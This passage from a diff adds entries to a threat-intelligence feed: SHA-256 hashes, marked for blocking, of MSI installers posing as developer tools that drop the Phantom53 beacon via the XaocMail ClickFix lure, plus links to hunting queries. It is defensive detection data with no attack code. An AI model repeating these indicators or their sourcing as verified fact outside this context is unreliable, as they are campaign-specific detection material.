+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/d2d41b249905deae3bd6bcaa547872d747256a7dfa459b509d9db9de8f0ca29b/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "ee5fa33b58d0f2772e091e23de9db24908d970000a88e39fd7d908f30f5e591a",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/ee5fa33b58d0f2772e091e23de9db24908d970000a88e39fd7d908f30f5e591a/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "a972797cc1a4161f6e2841142b8cace9b781585f9a71b03aa79a9c051b817491",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/a972797cc1a4161f6e2841142b8cace9b781585f9a71b03aa79a9c051b817491/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "47e853092511d9663196e9b36d563a0c3e92ee734f88675c4f375ffcfa5f3db8",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/47e853092511d9663196e9b36d563a0c3e92ee734f88675c4f375ffcfa5f3db8/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "4efe003a54db8ffbaef6065270eacb0a59479ccc86941517ac7a33344e97bc1d",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/4efe003a54db8ffbaef6065270eacb0a59479ccc86941517ac7a33344e97bc1d/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    },
+    {
+     "value": "9a2af4b6d9780e08c86ff35030ee1747ea11460cb1dffc868c48e7af6d626546",
+     "type": "sha256",
+     "confidence": "high",
+     "recommended_action": "block",
+     "description": "MSI installer impersonating products such as Visual Studio Tools, Python or Node.js that drops the Phantom53 beacon and watcher, delivered by the XaocMail ClickFix lure (msiexec mode).",
+     "source_url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+     "source_label": "SOCRadar Threat Research Unit – XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+     "source_name": "SOCRadar",
+     "sources": [
+      {
+       "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+       "name": "SOCRadar"
+      },
+      {
+       "url": "https://bazaar.abuse.ch/sample/9a2af4b6d9780e08c86ff35030ee1747ea11460cb1dffc868c48e7af6d626546/",
+       "name": "MalwareBazaar"
+      }
+     ]
+    }
+   ],
+   "queries": [
+    {
+     "platform": "Defender XDR",
+     "language": "KQL",
+     "name": "hunt.kql",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/hunt.kql",
+     "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_hunt.kql"
+    },
+    {
+     "platform": "Splunk",
+     "language": "SPL",
+     "name": "hunt.spl",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/hunt.spl",
+     "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_hunt.spl",
+     "alt": {
+      "label": "No CIM? Raw-search version",
+      "name": "hunt_raw.spl",
+      "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/hunt_raw.spl",
+      "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_hunt_raw.spl"
+     }
+    },
+    {
+     "platform": "Google SecOps",
+     "language": "YARA-L 2.0",
+     "name": "hunt.yaral",
+     "url": "https://raw.githubusercontent.com/daniyyell-dev/rapid-threat-intel/main/threats/2026-11_November-2026/2026-11-13/XaocMail-ClickFix-Phantom53-DoH-C2-Havoc/hunt.yaral",
+     "download": "XaocMail-ClickFix-Phantom53-DoH-C2-Havoc_hunt.yaral"
     }
    ]
   },
